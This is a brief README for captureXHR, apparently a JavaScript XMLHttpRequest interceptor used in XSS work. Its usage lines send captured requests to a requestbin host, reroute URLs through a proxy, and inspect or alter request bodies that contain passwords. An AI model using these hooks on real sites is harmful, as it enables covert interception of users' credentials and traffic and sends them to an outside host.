# captureXHR
## Usage
```
captureXHR('https://requestbin.herokuapp.com/oa2lf9oa');
```
result: http://requestb.in/oa2lf9oa?inspect
### Interceptor
#### onopen
```
captureXHR('https://pkav.net',{onopen:(method,url)=>console.log(url)})
```
```
captureXHR('https://pkav.net',{onopen:(method,url)=>{
  //Change argument
  url = `http://proxy/?${url}`;
  return {method,url};
}})
```
#### onsend
```
captureXHR('https://pkav.net',{onsend:(data)=>console.log(data)})
``
```
captureXHR('https://pkav.net',{onsend:(data)=>{
  if(data.indexOf('password')!==-1){
    data = 'xsser';
  }
  return data;
}})
``
